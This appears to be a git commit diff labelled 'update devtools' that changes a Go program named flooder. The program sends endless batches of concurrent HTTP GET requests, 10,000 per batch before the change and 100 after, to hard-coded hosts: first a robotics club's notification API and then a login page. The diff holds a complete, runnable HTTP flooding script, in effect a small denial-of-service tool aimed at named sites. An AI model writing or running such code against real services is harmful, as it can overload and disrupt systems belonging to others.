ecf2d5a0f8aad74e30629eca5924082d0e28d8a7
celestix <i@anodite.me>
2025-04-29 14:24:09 +0530

    update devtools

--- flooder/main.go
+++ flooder/main.go
@@ -1,31 +1,34 @@
 package main
 
-import (
-	"log"
-	"net/http"
-	"sync"
-)
+import "log"
+import "net/http"
+import "fmt"
+import "sync"
+
 
 func makeRequest() {
-	resp, err := http.Get("https://ccb.roboticsclubvitc.co/api/notification")
-	if err != nil {
-		log.Println("something wrong with you bitch: ", err.Error())
-		return
-	}
-	defer resp.Body.Close()
+        resp, err := http.Get("https://nginx.wlan0.in/login")
+        if err != nil {
+                log.Println("something wrong with you bitch: ", err.Error())
+                return
+        }
+        defer resp.Body.Close()
 }
 
 func main() {
-	numGoroutines := 10000
-	for {
-		wg := sync.WaitGroup{}
-		wg.Add(numGoroutines)
-		for i := 0; i < numGoroutines; i++ {
-			go func() {
-				defer wg.Done()
-				makeRequest()
-			}()
-		}
-		wg.Wait()
-	}
+        numGoroutines := 100
+        n := 0
+        for {
+                wg := sync.WaitGroup{}
+                wg.Add(numGoroutines)
+                for i := 0; i < numGoroutines; i++ {
+                        go func() {
+                                defer wg.Done()
+                                makeRequest()
+                        }()
+                }
+                wg.Wait()
+                n++
+                fmt.Println(n, "batch done")
+        }
 }
